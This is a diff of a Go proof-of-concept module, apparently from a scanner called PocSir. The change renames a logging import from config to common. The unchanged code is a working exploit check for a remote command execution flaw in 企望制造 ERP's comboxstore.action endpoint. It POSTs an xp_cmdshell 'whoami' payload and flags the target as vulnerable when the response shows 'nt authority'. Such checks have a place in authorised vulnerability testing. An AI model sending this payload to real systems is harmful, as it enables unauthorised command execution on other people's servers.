@@ -1,7 +1,7 @@
 package poc
 
 import (
-	"PocSir/config"
+	"PocSir/common"
 	"bytes"
 	"crypto/tls"
 	"io"
@@ -31,7 +31,7 @@ func QiWangERP_EXEC(target string) {
 	execPoc := []byte(`comboxsql=exec xp_cmdshell 'whoami'`)
 	req, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(execPoc))
 	if err != nil {
-		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
+		common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
 		return
 	}
 
@@ -40,17 +40,17 @@ func QiWangERP_EXEC(target string) {
 	}
 	resp, err := client.Do(req)
 	if err != nil {
-		config.ErrMsg.Printf("[-]%s is timeout\n", target)
+		common.ErrMsg.Printf("[-]%s is timeout\n", target)
 		return
 	}
 	defer resp.Body.Close()
 
 	body, _ := io.ReadAll(resp.Body)
 	if resp.StatusCode == http.StatusOK && strings.Contains(string(body), "nt authority") {
-		config.Right.Printf("[+]%s存在企望制造 ERP comboxstore.action 远程命令执行漏洞\n", target)
-		config.TextPut.Printf(string(body) + "\n")
+		common.Right.Printf("[+]%s存在企望制造 ERP comboxstore.action 远程命令执行漏洞\n", target)
+		common.TextPut.Printf(string(body) + "\n")
 	} else {
-		config.ErrMsg.Printf("[-]%s不存在企望制造 ERP comboxstore.action 远程命令执行漏洞\n", target)
+		common.ErrMsg.Printf("[-]%s不存在企望制造 ERP comboxstore.action 远程命令执行漏洞\n", target)
 		//TextPut.Printf(string(body) + "\n")
 	}
 }
